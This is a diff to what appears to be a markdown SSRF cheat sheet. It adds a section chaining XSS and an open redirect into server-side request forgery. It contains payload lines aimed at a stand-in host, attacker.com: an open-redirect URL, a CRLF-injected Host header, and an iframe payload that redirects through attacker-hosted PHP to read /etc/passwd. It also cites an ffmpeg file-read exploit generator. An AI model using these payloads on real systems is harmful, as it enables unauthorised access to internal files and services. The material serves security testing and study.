@@ -88,13 +88,13 @@ gopher://
 
 ## SSRF Chaining
 
-Open redirect to SSRF 
+### Open redirect to SSRF 
 find a file via bruteforce the URL parameter  chain with open redirect
 ```
 example.com/ssrf.php?url=/redirect.php?url=//attacker.com
 ```
 
-SSRF to CRLF:
+### SSRF to CRLF:
 ```
 example.com/ssrf.php?url=/test%0d%0aHost:%20attacker.com
 ```
@@ -110,6 +110,17 @@ if any Video upload functionality is there in the website we can exploit this.
 https://github.com/neex/ffmpeg-avi-m3u-xbin
 
 `./gen_xbin_avi.py file://<filename> file_read.avi`
+
+### XSS + Open Redirect --> SSRF (internal access)
+
+(this will more work in pdf generator feature)
+From XSS `<iframe src=//attacker.com/test.php>` this won't work because of SOP. where `test.php` have  `<?php header('Location:file:///etc/passwd'); ?>`.
+
+And if we found an Open redirect in the same, we can chain it with that XSS that can ping our attacker server.
+`target.com/api/logout"redirTo=//attacker.com`  can be our open redirect
+
+we can craft our XSS payload with `<iframe src=/api/logout?redirTo=//attacker.com/test.php></iframe>`. Now server renders iframe of its own origin gets redirect to attacker server which redirects to `file://etc/passwd`. 
+
 ## Bypassing restrictions from SSRF
 
 localhost bypass wordlist
